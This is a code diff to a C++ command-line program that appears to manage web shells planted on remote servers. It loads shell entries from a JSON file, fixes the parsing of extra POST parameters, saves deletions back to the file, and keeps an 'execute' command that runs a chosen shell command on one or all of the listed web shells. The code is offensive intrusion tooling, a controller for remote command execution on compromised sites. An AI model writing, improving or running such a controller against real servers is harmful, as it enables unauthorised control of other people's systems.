@@ -36,9 +36,9 @@ WebShell parseShell(json shell){
 				temp.addAddonGet(getIter.key(),getIter.value().get<string>());
 			}
 		}
-		if(shell["custom"]["addonget"].is_object()){
-			for(json::iterator postIter=shell["custom"]["addonget"].begin();postIter!=shell["custom"]["addonget"].end();++postIter){
-				temp.addAddonGet(postIter.key(),postIter.value().get<string>());
+		if(shell["custom"]["addonpost"].is_object()){
+			for(json::iterator postIter=shell["custom"]["addonpost"].begin();postIter!=shell["custom"]["addonpost"].end();++postIter){
+				temp.addAddonPost(postIter.key(),postIter.value().get<string>());
 			}
 		}
 	}
@@ -77,9 +77,9 @@ int main(){
 							temp.addAddonGet(getIter.key(),getIter.value().get<string>());
 						}
 					}
-					if((*it)["custom"]["addonget"].is_object()){
-						for(json::iterator postIter=(*it)["custom"]["addonget"].begin();postIter!=(*it)["custom"]["addonget"].end();++postIter){
-							temp.addAddonGet(postIter.key(),postIter.value().get<string>());
+					if((*it)["custom"]["addonpost"].is_object()){
+						for(json::iterator postIter=(*it)["custom"]["addonpost"].begin();postIter!=(*it)["custom"]["addonpost"].end();++postIter){
+							temp.addAddonPost(postIter.key(),postIter.value().get<string>());
 						}
 					}
 				}
@@ -91,10 +91,9 @@ int main(){
 			cout<<"[-]exception occured:"<<e.what()<<endl;
 		}
 		string command;
-		while(true){
+		cout<<">";
+		while(getline(cin,command)){
 			try{
-			cout<<">";
-			getline(cin,command);
 			vector<string> parseRes;
 			int begin,end;
 			begin=end=0;
@@ -133,6 +132,10 @@ int main(){
 						continue;
 					}
 					shells.erase(shells.begin()+num);
+					j.erase(j.begin()+num);
+					fstream config("shells.json",ios::out);
+					config<<j;
+					config.close();
 				}
 				else if(parseRes[0]=="execute"){
 					if(parseRes.size()!=3){
@@ -141,12 +144,12 @@ int main(){
 					}
 					if(parseRes[1]=="all"){
 						for(vector<WebShell>::iterator it=shells.begin();it!=shells.end();++it){
-							cout<<"###########################################"<<endl;
 							cout<<"executing command "<<parseRes[2]<<" on "<<it->getAddress()<<endl;
+							cout<<"-------------------------------------------"<<endl;
 							string answer;
 							CURLcode code=it->ShellCommandExec(parseRes[2],answer);
 							cout<<answer<<endl;
-							cout<<"###########################################"<<endl;
+							cout<<"-------------------------------------------"<<endl;
 						}
 					}
 					else{
@@ -156,11 +159,11 @@ int main(){
 							continue;
 						}
 						cout<<"executing command "<<parseRes[2]<<" on "<<shells[num].getAddress()<<endl;
-						cout<<"###########################################"<<endl;
+						cout<<"-------------------------------------------"<<endl;
 						string answer;
 						shells[num].ShellCommandExec(parseRes[2],answer);
 						cout<<answer<<endl;
-						cout<<"###########################################"<<endl;
+						cout<<"-------------------------------------------"<<endl;
 					}
 				}
 				else if(parseRes[0]=="list"){
@@ -189,6 +192,7 @@ int main(){
 		catch(exception& e){
 			cout<<"[-]exception occured:"<<e.what()<<endl;
 		}
+		cout<<">";
 	}
 	
 }
